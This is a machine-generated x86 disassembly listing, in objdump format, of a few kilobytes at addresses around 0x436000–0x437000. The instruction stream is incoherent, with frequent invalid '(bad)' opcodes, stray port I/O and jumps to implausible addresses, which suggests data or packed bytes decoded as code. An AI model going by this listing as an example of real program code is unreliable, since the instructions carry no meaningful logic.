  43695b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43695c:	or     eax,0x50c1fee7
  436961:	ret    0xb03
  436964:	fwait
  436965:	and    ebx,edi
  436967:	dec    edi
  436968:	cwde   
  436969:	imul   ecx,DWORD PTR [edi-0x5],0xffffffc2
  43696d:	test   eax,0x3e01662e
  436972:	xchg   ecx,eax
  436973:	mov    esp,0xfadd7a05
  436978:	mov    ch,0xf4
  43697a:	mov    dh,0xfa
  43697c:	mov    ds:0xcd853d0f,al
  436981:	add    BYTE PTR [ecx-0x79],bl
  436984:	dec    eax
  436985:	push   edi
  436986:	ins    DWORD PTR es:[edi],dx
  436987:	fs out 0x63,al
  43698a:	cmp    al,ch
  43698c:	fcomip st,st(5)
  43698e:	nop
  43698f:	xchg   esp,eax
  436990:	int    0x60
  436992:	fdivp  st(2),st
  436994:	fild   QWORD PTR [esi+edi*8+0x86]
	...
  4369b3:	add    BYTE PTR [eax],al
  4369b5:	add    BYTE PTR [edx-0x6c],al
  4369b8:	mov    ebx,DWORD PTR [ebp+esi*2+0x5d]
  4369bc:	pop    es
  4369bd:	push   eax
  4369be:	pop    edx
  4369bf:	ja     0x4369cb
  4369c1:	test   DWORD PTR [ebp-0x6d],ecx
  4369c4:	sbb    DWORD PTR [esi-0x33],esp
  4369c7:	arpl   WORD PTR [eax-0x21d6bcc1],cx
  4369cd:	dec    edi
  4369ce:	cmp    bh,bh
  4369d0:	sti    
  4369d1:	push   ebx
  4369d2:	add    al,BYTE PTR [eax-0x17]
  4369d5:	mov    BYTE PTR [edx+0x53],ch
  4369d8:	xlat   BYTE PTR ds:[ebx]
  4369d9:	nop
  4369da:	mov    DWORD PTR [edi],edi
  4369dc:	or     esp,edx
  4369de:	pop    ss
  4369df:	das    
  4369e0:	retfw  
  4369e2:	pop    ss
  4369e3:	mov    ch,BYTE PTR [ebx+0x18f4f2d7]
  4369e9:	loop   0x4369f2
  4369eb:	jge    0x436a15
  4369ed:	push   edi
  4369ee:	sbb    DWORD PTR [ebx],edx
  4369f0:	test   eax,0x2884516c
  4369f5:	add    al,0x4d
  4369f7:	test   DWORD PTR [ebx],esp
  4369f9:	fsubr  st,st(2)
  4369fb:	or     BYTE PTR [ecx-0x1114281f],bh
  436a01:	test   dl,bl
  436a03:	pop    edx
  436a04:	xor    eax,0xe7d84a07
  436a09:	push   esi
  436a0a:	adc    esi,edx
  436a0c:	and    esp,ecx
  436a0e:	add    dh,BYTE PTR ds:0x6b8f11a2
  436a14:	call   0xd4:0x2b8ba7e1
	...
  436a37:	add    BYTE PTR [ebx+0x3de13908],cl
  436a3d:	or     BYTE PTR [esi+0x5f],ch
  436a40:	lods   eax,DWORD PTR ds:[esi]
  436a41:	mov    esp,DWORD PTR [ebx]
  436a43:	lock xchg ebx,eax
  436a45:	or     BYTE PTR [ecx],bl
  436a47:	loope  0x436a26
  436a49:	pop    es
  436a4a:	pop    esi
  436a4b:	inc    edi
  436a4c:	jne    0x4369d9
  436a4e:	lock xor esi,DWORD PTR [esi+0x31]
  436a52:	stc    
  436a53:	xchg   BYTE PTR [edx-0x74245475],ch
  436a59:	or     dl,bl
  436a5b:	xchg   DWORD PTR [ebx],ecx
  436a5d:	xlat   BYTE PTR ds:[ebx]
  436a5e:	inc    ecx
  436a5f:	loope  0x436a23
  436a61:	(bad)  
  436a62:	xchg   edi,eax
  436a63:	or     edx,DWORD PTR [edx+0x2d9dffff]
  436a69:	inc    edi
  436a6a:	or     BYTE PTR [edx-0x6],ah
  436a6d:	retf   
  436a6e:	gs mov esi,0xfdde7f6
  436a74:	sub    al,0xda
  436a76:	pop    edx
  436a77:	mov    bh,0xe1
  436a79:	enter  0xb8be,0x26
  436a7d:	je     0x436aa3
  436a7f:	jmp    0x7b477e92
  436a84:	sbb    al,0x5e
  436a86:	add    BYTE PTR [ecx],al
  436a88:	jecxz  0x436a56
  436a8a:	cli    
  436a8b:	out    dx,al
  436a8c:	out    0x38,al
  436a8e:	cli    
  436a8f:	out    0xed,al
  436a91:	fld    QWORD PTR ds:0xfad27cd1
  436a97:	(bad)  
  436a98:	idiv   ch
  436a9a:	sti    
  436a9b:	into   
	...
  436ab8:	add    BYTE PTR [eax],al
  436aba:	in     eax,dx
  436abb:	fiadd  WORD PTR [edi+0x65d9edbb]
  436ac1:	call   0xb7391e7c
  436ac6:	lods   eax,DWORD PTR ds:[esi]
  436ac7:	aaa    
  436ac8:	mov    edi,0x84ce8816
  436acd:	mov    ebx,0x560b295a
  436ad2:	adc    BYTE PTR [edx-0x7b],ah
  436ad5:	test   eax,0x917f213a
  436ada:	dec    BYTE PTR [ebp+edx*1-0xa]
  436ade:	jne    0x436af4
  436ae0:	(bad)  
  436ae1:	imul   esp,DWORD PTR [esi+0x4e],0xce89ec74
  436ae8:	push   edi
  436ae9:	hlt    
  436aea:	add    eax,0x6f20b1e8
  436aef:	fstp   DWORD PTR [edx+0x2a]
  436af2:	jbe    0x436af0
  436af4:	(bad)  
  436af5:	call   0x6b02a608
  436afa:	and    eax,0x5c006600
  436aff:	sbb    dl,BYTE PTR [edi-0x3d]
  436b02:	mov    ds:0x223bedeb,al
  436b07:	das    
  436b08:	movnti DWORD PTR ds:[esi+ebx*2],eax
  436b0d:	cmp    edi,edx
  436b0f:	cs ss xor esi,esp
  436b13:	jnp    0x436b0c
  436b15:	sub    eax,0x261fd81
  436b1a:	pop    esp
  436b1b:	jecxz  0x436b2a
  436b1d:	add    DWORD PTR [eax],0x0
	...
  436b3c:	or     eax,0x1f157524
  436b41:	shl    DWORD PTR [eax-0x7d],1
  436b44:	std    
  436b45:	imul   DWORD PTR [esi+0x15]
  436b48:	(bad)  
  436b49:	mov    bh,0x4
  436b4b:	setae  bl
  436b4e:	mov    esi,DWORD PTR [edx+edi*8-0x6f]
  436b52:	jns    0x436b16
  436b54:	test   BYTE PTR [esi],0xaf
  436b57:	or     ah,BYTE PTR [edi-0x4d]
  436b5a:	sub    dh,BYTE PTR [ebx-0x3f]
  436b5d:	pop    esi
  436b5e:	test   ecx,ecx
  436b60:	add    BYTE PTR [ecx],al
  436b62:	jnp    0x436b2c
  436b64:	mov    ch,0xa9
  436b66:	cld    
  436b67:	jae    0x436b1c
  436b69:	scas   al,BYTE PTR es:[edi]
  436b6a:	fsubr  st,st(3)
  436b6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436b6d:	or     BYTE PTR [bx+si+0x1d],bl
  436b71:	in     eax,dx
  436b72:	push   ebp
  436b73:	ret    
  436b74:	loope  0x436afe
  436b76:	out    0x83,al
  436b78:	sbb    ah,cl
  436b7a:	dec    ecx
  436b7b:	push   esi
  436b7c:	repz lock test BYTE PTR [ebx+0x87cf304],0x80
  436b85:	inc    edi
  436b86:	dec    edi
  436b87:	push   0xfffffcac
  436b8c:	jmp    0x436bc4
  436b8e:	or     BYTE PTR [ebp-0x3b1d4a57],cl
  436b94:	or     eax,0x84fad9d3
  436b99:	pushf  
  436b9a:	shl    BYTE PTR [esi],cl
  436b9c:	dec    edx
  436b9d:	into   
  436b9e:	sub    BYTE PTR [edi+0x0],0x0
	...
  436bbd:	add    BYTE PTR [edi+eiz*8],cl
  436bc0:	inc    BYTE PTR [esi-0x880f538]
  436bc6:	and    dh,BYTE PTR [esi-0x18f35c80]
  436bcc:	(bad)  
  436bcd:	add    bh,BYTE PTR gs:[edx-0x7e5a750]
  436bd4:	push   ss
  436bd5:	ror    DWORD PTR [edx],cl
  436bd7:	pop    esp
  436bd8:	jns    0x436bda
  436bda:	or     eax,0x716631e7
  436bdf:	(bad)  
  436be0:	push   edi
  436be1:	or     BYTE PTR [eax+0x5088d66b],dl
  436be7:	jecxz  0x436bcf
  436be9:	mov    WORD PTR [ecx],ds
  436beb:	fcompp 
  436bed:	out    0x2f,al
  436bef:	fs dec eax
  436bf1:	cld    
  436bf2:	cmp    eax,0xdb1bc6bf
  436bf7:	lds    ecx,FWORD PTR [ebx-0x3cfe26bc]
  436bfd:	or     dl,BYTE PTR [ecx+0xd000544]
  436c03:	pop    esp
  436c04:	dec    eax
  436c05:	clc    
  436c06:	pop    ebp
  436c07:	aas    
  436c08:	jl     0x436c09
  436c0a:	mov    dl,0xe6
  436c0c:	out    0x2e,al
  436c0e:	add    eax,0xa586d975
  436c13:	arpl   dx,bx
  436c15:	or     dl,BYTE PTR [ecx+0xd00051e]
  436c1b:	push   0x60
  436c1d:	clc    
  436c1e:	cmp    eax,0x3980e6
	...
  436c3f:	add    BYTE PTR [edi+eiz*8],cl
  436c42:	inc    BYTE PTR [esi-0x17cdb130]
  436c48:	sti    
  436c49:	push   DWORD PTR [esi+0x287b0d03]
  436c4f:	push   cs
  436c50:	xchg   edi,eax
  436c51:	and    ch,al
  436c53:	add    ecx,DWORD PTR ds:0xd0bcb81
  436c59:	dec    esp
  436c5a:	cld    
  436c5b:	xor    eax,0x3e2b335
  436c60:	or     eax,0x1e58287c
  436c65:	adc    DWORD PTR [ebx],esi
  436c67:	fidivr WORD PTR [ecx+0x31d910cb]
  436c6d:	aam    0x19
  436c6f:	ss xor eax,0x17de0bcb
  436c75:	mov    BYTE PTR [edx],ah
  436c77:	in     al,dx
  436c78:	(bad)  
  436c79:	(bad)  
  436c7a:	call   0xf5917282
  436c7f:	mov    DWORD PTR [ecx-0x2c],ecx
  436c82:	add    BYTE PTR [edx+0x16],bh
  436c85:	shr    cl,cl
  436c87:	fnstsw WORD PTR [ecx-0x28]
  436c8a:	cmp    esp,ebp
  436c8c:	jecxz  0x436c85
  436c8e:	fcmovu st,st(5)
  436c90:	mov    edi,DWORD PTR ds:0x4cd69d5
  436c96:	les    ebx,FWORD PTR fs:[esi+0x4]
  436c9a:	shl    DWORD PTR [ebp-0x4f],1
  436c9d:	sar    DWORD PTR [ecx+0x6c08498b],cl
  436ca3:	les    eax,FWORD PTR [eax]
	...
  436cc1:	add    BYTE PTR [ecx-0x3],al
  436cc4:	ficom  WORD PTR ds:[edi+eiz*8+0x64]
  436cc9:	pop    DWORD PTR [eax+ecx*1+0x36]
  436ccd:	(bad)  
  436ccf:	div    esi
  436cd1:	inc    ebx
  436cd2:	or     eax,0xe2eca287
  436cd7:	(bad)  
  436cd8:	call   0x7580fee0
  436cdd:	mov    ecx,esp
  436cdf:	daa    
  436ce0:	add    BYTE PTR [edx-0x2e],ah
  436ce3:	ror    DWORD PTR [eax+0x447b3d27],cl
  436ce9:	icebp  
  436cea:	xchg   edi,eax
  436ceb:	inc    ecx
  436cec:	xor    BYTE PTR [ecx-0x26],dl
  436cef:	arpl   bx,di
  436cf1:	push   esi
  436cf2:	cld    
  436cf3:	shl    edx,0xd4
  436cf6:	xor    bh,BYTE PTR [edx+0x44]
  436cf9:	inc    ecx
  436cfa:	cld    
  436cfb:	mov    BYTE PTR [ecx+0x9],bh
  436cfe:	xchg   esi,eax
  436cff:	inc    ecx
  436d00:	and    al,0x60
  436d02:	add    ecx,DWORD PTR [ebx+edi*8]
  436d05:	aam    0x32
  436d07:	add    eax,0xd6fde940
  436d0c:	cmp    BYTE PTR [edi-0x41e1b2fe],bl
  436d12:	loope  0x436d42
  436d14:	push   ebx
  436d15:	push   cs
  436d16:	sbb    cl,BYTE PTR [edi]
  436d18:	adc    DWORD PTR [ecx-0x42be76f2],ebp
  436d1e:	and    eax,0x41d874bf
  436d23:	call   0x437187
	...
  436d44:	rcl    ch,1
  436d46:	push   edx
  436d47:	shl    DWORD PTR [ebx*8-0x298b2106],1
  436d4e:	push   edi
  436d4f:	ret    0xd739
  436d52:	jno    0x436d61
  436d54:	mov    al,0xeb
  436d56:	scas   eax,DWORD PTR es:[edi]
  436d57:	fisttp DWORD PTR [esi+0x0]
  436d5a:	lea    ebx,[edi]
  436d5c:	and    DWORD PTR [ebx-0x2],edi
  436d5f:	icebp  
  436d60:	ror    DWORD PTR [esi+0x1e],1
  436d63:	pop    esp
  436d64:	inc    ebx
  436d65:	or     BYTE PTR [ecx+0x39],dl
  436d68:	enter  0xa3eb,0xf8
  436d6c:	dec    esi
  436d6d:	add    BYTE PTR [ebp-0x7efcbd57],al
  436d73:	or     al,0x1
  436d75:	sar    edi,cl
  436d77:	push   DWORD PTR [esi+edi*8+0x73]
  436d7b:	or     al,BYTE PTR [ebx]
  436d7d:	lock not BYTE PTR ds:0x3acf68
  436d84:	in     eax,dx
  436d85:	idiv   DWORD PTR [eax]
  436d87:	cmp    ecx,DWORD PTR [ecx+0x19]
  436d8a:	cmp    DWORD PTR [esi+0x68],0xf
  436d8e:	dec    esi
  436d8f:	push   0x3d544e
  436d94:	dec    esp
  436d95:	(bad)  
  436d96:	inc    DWORD PTR [edi]
  436d98:	xor    al,0xe6
  436d9a:	popf   
  436d9b:	lods   eax,DWORD PTR ds:[esi]
  436d9c:	add    dh,BYTE PTR [esi+edi*2+0x620779c0]
  436da3:	add    ah,cl
  436da5:	mov    ah,0xde
  436da7:	inc    DWORD PTR [eax]
	...
  436dc5:	add    bl,dh
  436dc7:	push   0xef8feb00
  436dcc:	not    BYTE PTR [edi+0xc]
  436dcf:	mov    cl,0xde
  436dd1:	inc    DWORD PTR [ebx]
  436dd3:	or     al,0xe8
  436dd5:	in     al,dx
  436dd6:	sbb    BYTE PTR [ebp+esi*8-0x1cc2cbcd],dh
  436ddd:	adc    DWORD PTR [ebx],eax
  436ddf:	sub    al,0xf4
  436de1:	call   0x3946e9
  436de6:	sub    esp,esp
  436de8:	xlat   BYTE PTR ds:[ebx]
  436de9:	in     al,0xc3
  436deb:	mov    ch,0x79
  436ded:	enter  0x15c3,0x56
  436df1:	pop    ebx
  436df2:	lods   eax,DWORD PTR ds:[esi]
  436df3:	mov    edx,0x8129fffe
  436df8:	out    0x51,al
  436dfa:	and    eax,0x28d4f09
  436dff:	add    al,0x4f
  436e01:	mov    ecx,esp
  436e03:	mov    bl,0xf5
  436e05:	adc    eax,0x3aca0c
  436e0a:	(bad)  
  436e0b:	xchg   edx,eax
  436e0c:	aaa    
  436e0d:	pop    esi
  436e0e:	or     eax,0x86744abf
  436e13:	sbb    DWORD PTR [eax],ebp
  436e15:	aaa    
  436e16:	dec    esi
  436e17:	shl    DWORD PTR [edi-0x77],cl
  436e1a:	loopne 0x436e6e
  436e1c:	dec    esi
  436e1d:	xor    bh,BYTE PTR [edx+0x21]
  436e20:	adc    BYTE PTR [edi-0x31ee7535],al
  436e26:	bound  esi,QWORD PTR [ecx+0x8922]
	...
  436e48:	mov    ebx,0x9ce6aea
  436e4d:	out    0x30,al
  436e4f:	xor    BYTE PTR [esi+0x155b1d2d],al
  436e55:	xchg   ebx,eax
  436e56:	es sti 
  436e58:	sbb    bh,bl
  436e5a:	icebp  
  436e5b:	aas    
  436e5c:	or     eax,0xf0083efe
  436e61:	inc    esi
  436e62:	jae    0x436e67
  436e64:	or     eax,0xc8faee76
  436e69:	repnz mov al,BYTE PTR [ecx+ebx*1-0x52]
  436e6e:	inc    eax
  436e6f:	sub    al,0x9f
  436e71:	sbb    al,0xd7
  436e73:	je     0x436e7a
  436e75:	out    dx,al
  436e76:	and    eax,0x37502289
  436e7b:	add    al,0x84
  436e7d:	imul   eax,DWORD PTR [esi],0x698b4b87
  436e83:	rol    BYTE PTR [edx],0xe6
  436e86:	inc    eax
  436e87:	sub    BYTE PTR [edi-0x36],dh
  436e8a:	cs sti 
  436e8c:	pusha  
  436e8d:	(bad)  
  436e8f:	adc    al,0x41
  436e91:	leave  
  436e92:	add    BYTE PTR ds:[esi+0x38fb02a2],cl
  436e99:	mov    edi,0xb51914d5
  436e9e:	add    BYTE PTR ds:[ebp-0x19],bh
  436ea2:	jmp    0xa243b0af
  436ea7:	lock push es
  436ea9:	out    dx,al
  436eaa:	sub    BYTE PTR [eax+eax*1],al
	...
  436ec9:	add    bl,ch
  436ecb:	mov    edi,0xbdc43f31
  436ed0:	in     al,0x3
  436ed2:	loopne 0x436e58
  436ed4:	xchg   esp,eax
  436ed5:	xchg   BYTE PTR [esi-0x11],dh
  436ed8:	adc    eax,0x723a4f33
  436edd:	add    esi,DWORD PTR [esi-0x16]
  436ee0:	shl    dh,1
  436ee2:	sub    al,BYTE PTR [eax]
  436ee4:	outs   dx,BYTE PTR ds:[esi]
  436ee5:	fist   DWORD PTR [ecx-0x7bcc0ec7]
  436eeb:	cmp    bl,BYTE PTR [ecx-0x26]
  436eee:	stc    
  436eef:	div    esi
  436ef1:	inc    ebx
  436ef2:	or     eax,0xe18c1e0d
  436ef7:	xlat   BYTE PTR ds:[ebx]
  436ef8:	(bad)  
  436ef9:	cmp    ecx,ebp
  436efb:	dec    ecx
  436efc:	mov    dl,0x8e
  436efe:	leave  
  436eff:	pop    es
  436f00:	retw   
  436f02:	push   cs
  436f03:	xchg   DWORD PTR [ebx-0xecd6a31],ebp
  436f09:	mov    cs,esp
  436f0b:	daa    
  436f0c:	jg     0x436f04
  436f0e:	cmp    DWORD PTR [ebx],0xcf5afff1
  436f14:	jnp    0x436ee5
  436f16:	pop    es
  436f17:	mul    BYTE PTR [eax+0x66003af1]
  436f1d:	mov    edi,0x50288506
  436f22:	dec    esi
  436f23:	jnp    0x436f4f
  436f25:	adc    al,0xe2
  436f27:	inc    esp
  436f28:	icebp  
  436f29:	sbb    DWORD PTR [ecx-0x4],0xffffffe8
  436f2d:	dec    esi
	...
  436f4a:	add    BYTE PTR [eax],al
  436f4c:	add    DWORD PTR [ebx],edx
  436f4e:	mov    al,ds:0x3079128b
  436f53:	add    BYTE PTR [eax+edi*1+0x7af3ecf1],dl
  436f5a:	jmp    eax
  436f5c:	xor    edi,DWORD PTR [eax-0x4d66228d]
  436f62:	es mov eax,0xfa87d58e
  436f68:	push   cs
  436f69:	add    BYTE PTR [esi-0xc],ch
  436f6c:	mov    ch,0xf
  436f6e:	add    al,0x3
  436f70:	mov    ch,BYTE PTR [eax]
  436f72:	mov    ecx,eax
  436f74:	daa    
  436f75:	cmp    BYTE PTR [ebx+edi*8],al
  436f78:	push   es
  436f79:	jns    0x436ff2
  436f7b:	loope  0x436f04
  436f7d:	inc    edi
  436f7e:	add    al,0x82
  436f80:	or     eax,0xef1604f
  436f85:	ret    0x5e44
  436f88:	push   cs
  436f89:	retf   
  436f8a:	inc    esp
  436f8b:	push   ecx
  436f8c:	add    BYTE PTR [eax+edi*8+0x6a],0xa
  436f91:	clc    
  436f92:	or     ebp,DWORD PTR [edx+0x48]
  436f95:	repnz cmps DWORD PTR ss:[esi],DWORD PTR es:[edi]
  436f98:	repnz pop ebp
  436f9a:	lea    esi,[esi]
  436f9c:	ret    0xfacf
  436f9f:	aam    0x22
  436fa1:	std    
  436fa2:	aas    
  436fa3:	jmp    0xbf3eb438
  436fa8:	fnstcw WORD PTR [eax+0x350ee1bd]
  436fae:	xchg   ebp,edi
	...
  436fcc:	add    BYTE PTR [eax],al
  436fce:	xchg   ecx,eax
  436fcf:	loop   0x436fc8
  436fd1:	push   0xfffffff5
  436fd3:	inc    BYTE PTR [esi-0x6fb17616]
  436fd9:	call   0x60956fec
  436fde:	dec    ebp
  436fdf:	and    al,0xc
  436fe1:	jb     0x43702c
  436fe3:	or     al,0x53
  436fe5:	jo     0x437001
  436fe7:	and    al,0x14
  436fe9:	push   0xffffffc4
  436feb:	leave  
  436fec:	push   ecx
  436fed:	inc    ebx
  436fee:	adc    DWORD PTR [ebp+0x43],edi
  436ff1:	add    BYTE PTR [eax],dl
  436ff3:	int3   
  436ff4:	dec    edx
  436ff5:	push   0xffffffa6
  436ff7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436ff8:	adc    edi,esp
  436ffa:	aam    0x42
  436ffc:	add    BYTE PTR ds:0x1b6,bh
  437002:	add    bl,bh
  437004:	jp     0x436ffe
  437006:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  437007:	test   DWORD PTR [ecx+eiz*4-0x7cfffd5c],0x82010
  437012:	mov    edx,0x6507c8b
  437018:	mov    ds:0x4ffc278d,eax
  43701d:	inc    DWORD PTR [ecx-0x36]
  437020:	or     al,0x40
  437022:	je     0x43709f
  437024:	cmp    DWORD PTR [eax],esp
  437026:	icebp  
  437027:	ret    0x226e
  43702a:	out    dx,eax
  43702b:	cmp    esp,DWORD PTR [eax*4+0x51133eed]
	...
  43704e:	add    BYTE PTR [eax],al
  437050:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  437051:	fisubr DWORD PTR [ebp-0x1d]
  437054:	sti    
  437055:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  437056:	cmp    eax,0x892443af
  43705c:	jo     0x43704c
  43705e:	or     eax,DWORD PTR [ebp-0x41f9c215]
  437064:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  437065:	aaa    
  437066:	or     al,BYTE PTR [eax]
  437068:	sldt   WORD PTR [ebx+0x7af9d07c]
  43706f:	into   
  437070:	or     eax,DWORD PTR [esi-0x576bf7c7]
  437076:	adc    ebx,DWORD PTR [esi+edx*8]
  437079:	inc    ecx
  43707a:	add    BYTE PTR [ebp+0x538c3efb],al
  437080:	mov    esp,0xe4fff9a6
  437085:	dec    ebp
  437086:	mov    ebx,0x65f30d74
  43708b:	add    BYTE PTR [esi-0x41],bl
  43708e:	jbe    0x43708f
  437090:	ret    0x7ad7
  437093:	mov    edi,0x73d1c741
  437098:	jmp    0x11a99a7f
  43709d:	inc    ecx
  43709e:	add    al,0x66
  4370a0:	fbld   TBYTE PTR [ebp+0x19bfe80e]
  4370a6:	sar    edx,cl
  4370a8:	add    ch,BYTE PTR ds:0xd26bf2d4
  4370ae:	int3   
  4370af:	sub    BYTE PTR [ebx-0x29],0x71
  4370b3:	and    eax,DWORD PTR [eax]
	...
  4370d1:	add    BYTE PTR ds:0xc27fba58,cl
  4370d7:	test   al,0xfe
  4370d9:	push   edx
  4370da:	jne    0x43711a
  4370dc:	fdivp  st(2),st
  4370de:	bound  esi,QWORD PTR [eax]
  4370e0:	cmp    bh,bl
  4370e2:	pop    edx
  4370e3:	cs xchg edx,eax
  4370e5:	jg     0x4370a9
  4370e7:	enter  0xe6fe,0x3b
  4370eb:	sahf   
  4370ec:	xor    al,0x87
  4370ee:	sub    BYTE PTR [ebp+edi*4+0x1a6b864e],ah
  4370f5:	or     BYTE PTR ds:0x2afad1e5,ah
  4370fb:	retf   0x56be
  4370fe:	dec    edi
  4370ff:	(bad)  
  437101:	dec    esi
  437102:	ret    
  437103:	push   ecx
  437104:	aam    0x52
  437106:	adc    BYTE PTR [ebp-0x2bf5b0fa],0xf6
  43710d:	or     eax,0x7987d74d
  437112:	and    eax,0x69e809ce
  437117:	stc    
  437118:	sar    dl,cl
  43711a:	jmp    0xc700:0x41e80f54
  437121:	(bad)  
  437122:	xlat   BYTE PTR ds:[ebx]
  437123:	pop    ecx
  437124:	stc    
  437125:	cmp    ecx,edi
  437127:	add    al,0xe9
  437129:	ds push ebp
  43712b:	push   ebx
  43712c:	rol    BYTE PTR [edx+0xdc21fcc],1
  437132:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  437133:	aaa    
  437134:	(bad)  
  437135:	(bad)  
	...
  437152:	add    BYTE PTR [eax],al
  437154:	mov    bh,0x59
  437156:	loope  0x437193
  437158:	iret   
  437159:	add    eax,0x53553de9
  43715e:	mov    al,ds:0xfcf29632
  437163:	icebp  
  437164:	sar    bh,cl
  437166:	xor    DWORD PTR [esi],esi
  437168:	loop   0x43712a
  43716a:	xor    ecx,DWORD PTR [ebx+0x17947e76]
  437170:	or     al,0x0
  437172:	jmp    0x5e7850a9
  437177:	pop    eax
  437178:	adc    eax,0x7a8ae179
  43717d:	outs   dx,DWORD PTR ds:[esi]
  43717e:	out    0x3,eax
  437180:	or     eax,0x52d6a3c6
  437185:	jnp    0x437132
  437187:	(bad)  
  437189:	js     0x4371dc
  43718b:	jmp    0x437191
  43718d:	retf   
  43718e:	inc    ecx
  43718f:	(bad)  
  437190:	mov    ?,WORD PTR [edi-0x9e8017]
  437196:	call   0x4186049e
  43719b:	jmp    0x43716c
  43719d:	js     0x4371c0
  43719f:	(bad)  
  4371a0:	xchg   ebx,eax
  4371a1:	iret   
  4371a2:	gs aad 0x10
  4371a5:	push   ebx
  4371a6:	in     eax,dx
  4371a7:	imul   ebx,DWORD PTR ds:0x482e1d7,0x73007bf4
  4371b1:	in     al,dx
  4371b2:	mov    al,ds:0xef0ea
  4371b7:	sub    DWORD PTR [eax],eax
	...
  4371d5:	add    BYTE PTR [esi],bl
  4371d7:	jge    0x43721d
  4371d9:	inc    ecx
  4371da:	je     0x4371dc
  4371dc:	push   eax
  4371dd:	out    0xea,al
  4371df:	cmp    edx,DWORD PTR [edx]
  4371e1:	sub    DWORD PTR [ecx],ecx
  4371e3:	dec    ebx
  4371e4:	(bad)  
  4371e5:	in     eax,0x68
  4371e7:	jns    0x43725d
  4371e9:	or     DWORD PTR [ebx+0x36],0xd98de374
  4371f0:	adc    al,0x34
  4371f2:	push   edi
  4371f3:	bound  edx,QWORD PTR [eax]
  4371f5:	fs jmp 0x4f8f:0xe25c4fd8
  4371fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4371fe:	stos   BYTE PTR es:[edi],al
  4371ff:	aaa    
  437200:	adc    ch,BYTE PTR [ecx]
  437202:	or     DWORD PTR [ebx-0x3c],ecx
  437205:	in     eax,0x75
  437207:	add    DWORD PTR [edi+0x44787624],eax
  43720d:	push   ebp
  43720e:	fild   DWORD PTR [edx+0xe78044]
  437214:	sti    
  437215:	cld    
  437216:	jbe    0x437279
  437218:	shr    DWORD PTR [ecx+0x39747d11],0xbb
  43721f:	js     0x437265
  437221:	xchg   ebx,eax
  437222:	popa   
  437223:	cli    
  437224:	xchg   DWORD PTR [esi+0x60],edx
  437227:	cmp    ch,BYTE PTR [eax-0x7]
  43722a:	and    DWORD PTR [eax],eax
  43722c:	add    BYTE PTR [edx+edi*8-0x69],dh
  437230:	xchg   BYTE PTR [edi],ch
  437232:	and    DWORD PTR [esi+eax*4-0x4080bfca],esp
  437239:	mov    ah,0x0
	...
  437257:	add    bh,cl
  437259:	popa   
  43725a:	add    DWORD PTR [edx+ebx*8-0x1d],esi
  43725e:	dec    edi
  43725f:	jb     0x4372a1
  437261:	jecxz  0x4372a1
  437263:	adc    al,0xe0
  437265:	lds    ecx,FWORD PTR [esp+edx*4+0x44bdbe]
  43726c:	adc    al,0x9c
  43726e:	test   BYTE PTR [eax-0x1c],al
  437271:	(bad)  
  437272:	mov    ah,0x89
  437274:	jecxz  0x437229
  437276:	clc    
  437277:	inc    ebp
  437278:	repz jle 0x4372f6
  43727b:	jmp    edi
  43727d:	add    edi,DWORD PTR [edx+0x40]
  437280:	mov    bl,0xb3
  437282:	cmc    
  437283:	xor    dh,BYTE PTR [ebx+edx*1+0x56]
  437287:	pop    ebx
  437288:	ins    DWORD PTR es:[edi],dx
  437289:	rol    BYTE PTR [edx],0x0
  43728c:	pop    esi
  43728d:	dec    DWORD PTR [ebp+eax*2-0x87cf138]
  437294:	int3   
  437295:	int    0xfb
  437297:	push   DWORD PTR [ebx-0x29]
  43729a:	rol    DWORD PTR [ebx+0x74fff7f1],1
  4372a0:	push   cs
  4372a1:	adc    DWORD PTR [ebp-0x52293bbb],ecx
  4372a7:	mov    DWORD PTR [ebx-0x17277b4d],edx
  4372ad:	xchg   DWORD PTR ds:0xfffede84,eax
  4372b3:	(bad)  
  4372b4:	out    dx,eax
  4372b5:	mov    ebx,0xfe7498e7
  4372ba:	jmp    FWORD PTR [ecx+0x0]
	...
  4372d9:	add    BYTE PTR [ebx-0x7f],ah
  4372dc:	jnp    0x4372a2
  4372de:	dec    esp
  4372df:	(bad)  
  4372e0:	sub    esp,DWORD PTR [edi-0x1d]
  4372e3:	mov    bl,0xf5
  4372e5:	jne    0x437347
  4372e7:	xor    DWORD PTR [ebx-0xa4c2d38],0x14d6246a
  4372f1:	adc    eax,0x7582fe34
  4372f6:	inc    eax
  4372f7:	ja     0x4372b6
  4372f9:	mov    DWORD PTR [ecx-0xc0008f6],ebp
  4372ff:	add    DWORD PTR [ebx-0x74],0xbee6870d
  437306:	xchg   edi,eax
  437307:	cli    
  437308:	rol    DWORD PTR [ebx+0xb154bcd],cl
  43730e:	mov    edx,0x554782a4
  437313:	dec    ebx
  437314:	cli    
  437315:	jle    0x43730c
  437317:	mov    ah,0x49
  437319:	add    bl,BYTE PTR [esi]
  43731b:	xchg   edi,eax
  43731c:	mov    DWORD PTR gs:[eax+0x59],ecx
  437320:	add    DWORD PTR [ecx+ebp*2+0x5dfaceb2],0x5d8c492c
  43732b:	scas   eax,DWORD PTR es:[edi]
  43732c:	out    0x90,al
  43732e:	mov    dl,0x8a
  437330:	xchg   DWORD PTR [edi-0x7b8055df],edi
  437336:	inc    ecx
  437337:	call   0xc449:0x543dface
	...
  43735a:	add    BYTE PTR [eax],al
  43735c:	cmp    eax,0x8bc7895c
  437361:	jb     0x437331
  437363:	dec    edi
  437364:	jne    0x4373c8
  437366:	stc    
  437367:	(bad)  
  437368:	jp     0x4373be
  43736a:	mov    edi,eax
  43736c:	jae    0x4373b8
  43736e:	iret   
  43736f:	dec    edi
  437370:	mov    esi,0xd7513fe
  437375:	xlat   BYTE PTR ds:[ebx]
  437376:	cmp    BYTE PTR [ebp-0x17cbf930],cl
  43737c:	adc    eax,0x98facf45
  437381:	ins    BYTE PTR es:[edi],dx
  437382:	mov    ebx,0x7a3a42f9
  437387:	xlat   BYTE PTR ds:[ebx]
  437388:	and    eax,0x32fff7cc
  43738d:	dec    esi
  43738e:	pop    ecx
  43738f:	or     BYTE PTR [edi+0x29447fd6],dh
  437395:	addr16 (bad) 
  437397:	dec    ebx
  437398:	sbb    DWORD PTR [eax],eax
